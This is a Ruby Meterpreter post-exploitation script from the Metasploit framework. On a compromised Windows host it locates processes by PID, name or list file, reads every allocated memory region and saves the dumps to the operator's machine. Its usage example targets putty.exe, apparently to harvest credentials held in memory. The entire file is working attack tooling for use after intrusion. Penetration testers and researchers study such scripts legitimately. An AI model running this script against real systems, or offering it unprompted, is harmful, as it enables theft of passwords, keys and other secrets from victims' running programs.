# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Note: Script is based on the paper Neurosurgery With Meterpreter by
#	Colin Ames (amesc[at]attackresearch.com) David Kerb (dkerb[at]attackresearch.com)
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
require 'fileutils'
pid = nil
name = nil
toggle = nil
resource = nil
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-p" => [ true, "PID of process to dump."],
	"-n" => [ true, "Name of process to dump."],
	"-r" => [ true, "Text file wih list of process names to dump memory for, one per line."],
	"-t" => [ false, "toggle location information in dump."]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line("")
		print_line("USAGE:")
		print_line("EXAMPLE: run process_dump putty.exe") 
		print_line("EXAMPLE: run process_dump -p 1234") 
		print_line(opts.usage) 
		raise Rex::Script::Completed
	when "-p"
		pid = val
	when "-n"
		name = val
	when "-t"
		toggle = true
	when "-r"
                list = val
		resource = ""
                if not ::File.exists?(list)
                        raise "Command List File does not exists!"
                else
                        ::File.open(list, "r").each_line do |line|
                                resource << line
                        end
                end
	end
}


# Function for finding the name of a process given it's PID
def find_procname(pid)
	name = nil
	client.sys.process.get_processes.each do |proc|
		if proc['pid'] == pid.to_i
			name = proc['name']
		end
	end
	return name
end

# Find all PID's for a given process name
def find_pids(name)
	proc_pid = []
	client.sys.process.get_processes.each do |proc|
		if proc['name'] == name
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end

# Dumps the memory for a given PID
def dump_mem(pid,name, toggle)
	host,port = client.tunnel_peer.split(':')
	# Create Filename info to be appended to created files
	filenameinfo = "_#{name}_#{pid}_" + ::Time.now.strftime("%Y%m%d.%M%S")
	# Create a directory for the logs
	logs = ::File.join(Msf::Config.log_directory, 'scripts', 'proc_memdump')
	# Create the log directory
	::FileUtils.mkdir_p(logs)
	#Dump file name
	dumpfile = logs + ::File::Separator + host + filenameinfo + ".dmp"
	print_status("\tDumping Memory of #{name} with PID: #{pid.to_s}")
	begin
		dump_process = client.sys.process.open(pid.to_i, PROCESS_READ)
	rescue
		print_error("Could not open process for reading memory!")
		raise Rex::Script::Completed
	end
	# MaximumApplicationAddress for 32bit or close enough
	maximumapplicationaddress = 2147418111
	base_size = 0
	while base_size < maximumapplicationaddress
		mbi = dump_process.memory.query(base_size)
		# Check if Allocated
		if mbi["Available"].to_s == "false"
			file_local_write(dumpfile,mbi.inspect) if toggle
			file_local_write(dumpfile,dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]))
			print_status("\tbase size = #{base_size}")
		end
		base_size += mbi["RegionSize"]
	end
	print_status("Saving Dumped Memory to #{dumpfile}")
	
end

if client.platform =~ /win32|win64/
	if resource
		resource.each do |r|
			print_status("Dumping memory for #{r.chomp}")
			pids = find_pids(r.chomp)
			if pids.length == 0
				print_status("\tProcess #{r.chomp} not found!")
				next
			end
			pids.each do |p|
				dump_mem(p,r.chomp,toggle)
			end
		end
	elsif pid
		proc_name = find_procname(pid)
		print_status("Dumping memory for #{proc_name}")
		dump_mem(pid,proc_name,toggle)
	elsif name
		print_status("Dumping memory for #{name}")
		find_pids(name).each do |p|
			dump_mem(p,name,toggle)
		end
	end
else
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end